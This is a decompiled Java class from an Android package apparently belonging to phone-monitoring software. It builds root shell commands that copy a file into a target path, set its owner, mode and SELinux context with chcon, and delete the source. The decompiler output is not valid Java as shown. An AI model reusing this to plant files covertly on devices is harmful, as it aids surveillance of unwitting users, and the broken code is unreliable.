package com.vvt.r;

import android.os.Build.VERSION;
import com.vvt.ak.a;
import com.vvt.shell.f;

public class b
{
  public static String a = "ShellFile";
  private static boolean b = a.a;
  private static boolean c = a.e;
  private String d;
  private String e;
  private String f;
  private String g;
  private String h;
  private String i;
  private boolean j;
  private f k = null;
  
  public b(String paramString1, String paramString2, String paramString3, String paramString4, String paramString5, String paramString6, boolean paramBoolean, f paramf)
  {
    this.d = paramString1;
    this.h = paramString3;
    this.g = paramString2;
    this.f = paramString5;
    this.e = paramString4;
    this.i = paramString6;
    this.j = paramBoolean;
    this.k = paramf;
  }
  
  public boolean a(boolean paramBoolean)
  {
    try
    {
      Object localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      String str = this.g;
      localObject1 = ((StringBuilder)localObject1).append(str);
      str = "/";
      localObject1 = ((StringBuilder)localObject1).append(str);
      str = this.h;
      localObject1 = ((StringBuilder)localObject1).append(str);
      str = ((StringBuilder)localObject1).toString();
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      Object localObject2 = this.d;
      localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
      localObject2 = "/";
      localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
      localObject2 = this.h;
      localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
      localObject2 = ((StringBuilder)localObject1).toString();
      localObject1 = "";
      Object localObject3 = new java/lang/StringBuilder;
      ((StringBuilder)localObject3).<init>();
      localObject1 = ((StringBuilder)localObject3).append((String)localObject1);
      localObject3 = "cat ";
      localObject1 = ((StringBuilder)localObject1).append((String)localObject3);
      localObject1 = ((StringBuilder)localObject1).append(str);
      localObject3 = " > ";
      localObject1 = ((StringBuilder)localObject1).append((String)localObject3);
      localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
      localObject3 = ";";
      localObject1 = ((StringBuilder)localObject1).append((String)localObject3);
      localObject1 = ((StringBuilder)localObject1).toString();
      localObject3 = this.i;
      if (localObject3 != null)
      {
        localObject3 = new java/lang/StringBuilder;
        ((StringBuilder)localObject3).<init>();
        localObject1 = ((StringBuilder)localObject3).append((String)localObject1);
        localObject3 = "chown ";
        localObject1 = ((StringBuilder)localObject1).append((String)localObject3);
        localObject3 = this.i;
        localObject1 = ((StringBuilder)localObject1).append((String)localObject3);
        localObject3 = ":";
        localObject1 = ((StringBuilder)localObject1).append((String)localObject3);
        localObject3 = this.i;
        localObject1 = ((StringBuilder)localObject1).append((String)localObject3);
        localObject3 = " ";
        localObject1 = ((StringBuilder)localObject1).append((String)localObject3);
        localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
        localObject3 = ";";
        localObject1 = ((StringBuilder)localObject1).append((String)localObject3);
        localObject1 = ((StringBuilder)localObject1).toString();
      }
      localObject3 = this.e;
      if (localObject3 != null)
      {
        localObject3 = new java/lang/StringBuilder;
        ((StringBuilder)localObject3).<init>();
        localObject1 = ((StringBuilder)localObject3).append((String)localObject1);
        localObject3 = "chmod ";
        localObject1 = ((StringBuilder)localObject1).append((String)localObject3);
        localObject3 = this.e;
        localObject1 = ((StringBuilder)localObject1).append((String)localObject3);
        localObject3 = " ";
        localObject1 = ((StringBuilder)localObject1).append((String)localObject3);
        localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
        localObject3 = ";";
        localObject1 = ((StringBuilder)localObject1).append((String)localObject3);
        localObject1 = ((StringBuilder)localObject1).toString();
        boolean bool1 = this.j;
        if (bool1)
        {
          localObject3 = new java/lang/StringBuilder;
          ((StringBuilder)localObject3).<init>();
          localObject1 = ((StringBuilder)localObject3).append((String)localObject1);
          localObject3 = "chmod 755 ";
          localObject1 = ((StringBuilder)localObject1).append((String)localObject3);
          localObject3 = this.d;
          localObject1 = ((StringBuilder)localObject1).append((String)localObject3);
          localObject3 = ";";
          localObject1 = ((StringBuilder)localObject1).append((String)localObject3);
          localObject1 = ((StringBuilder)localObject1).toString();
        }
      }
      int m = Build.VERSION.SDK_INT;
      int n = 19;
      if (m >= n)
      {
        localObject3 = this.f;
        if (localObject3 != null)
        {
          localObject3 = new java/lang/StringBuilder;
          ((StringBuilder)localObject3).<init>();
          localObject1 = ((StringBuilder)localObject3).append((String)localObject1);
          localObject3 = "chcon ";
          localObject1 = ((StringBuilder)localObject1).append((String)localObject3);
          localObject3 = this.f;
          localObject1 = ((StringBuilder)localObject1).append((String)localObject3);
          localObject3 = " ";
          localObject1 = ((StringBuilder)localObject1).append((String)localObject3);
          localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
          localObject2 = ";";
          localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
          localObject1 = ((StringBuilder)localObject1).toString();
          bool2 = this.j;
          if (bool2)
          {
            localObject2 = new java/lang/StringBuilder;
            ((StringBuilder)localObject2).<init>();
            localObject1 = ((StringBuilder)localObject2).append((String)localObject1);
            localObject2 = "chcon ";
            localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
            localObject2 = this.f;
            localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
            localObject2 = " ";
            localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
            localObject2 = this.d;
            localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
            localObject2 = ";";
            localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
            localObject1 = ((StringBuilder)localObject1).toString();
          }
        }
      }
      boolean bool2 = b;
      if (bool2) {}
      localObject2 = this.k;
      ((f)localObject2).a((String)localObject1);
      if (paramBoolean)
      {
        bool3 = b;
        if (bool3) {}
        localObject1 = this.k;
        localObject2 = "rm %s";
        m = 1;
        localObject3 = new Object[m];
        n = 0;
        localObject3[0] = str;
        str = String.format((String)localObject2, (Object[])localObject3);
        ((f)localObject1).a(str);
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool3 = c;
        if (!bool3) {}
      }
    }
    return false;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/r/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */